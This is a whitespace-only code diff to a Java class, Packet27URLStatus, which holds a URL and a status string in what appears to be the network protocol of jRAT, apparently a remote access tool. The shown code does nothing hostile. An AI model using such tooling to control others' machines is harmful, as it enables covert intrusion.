@@ -4,12 +4,11 @@ import java.io.DataOutputStream;
 
 import pro.jrat.common.io.StringWriter;
 
-
 public class Packet27URLStatus extends AbstractOutgoingPacket {
 
 	private String url;
 	private String status;
-	
+
 	public Packet27URLStatus(String url, String status) {
 		this.url = url;
 		this.status = status;
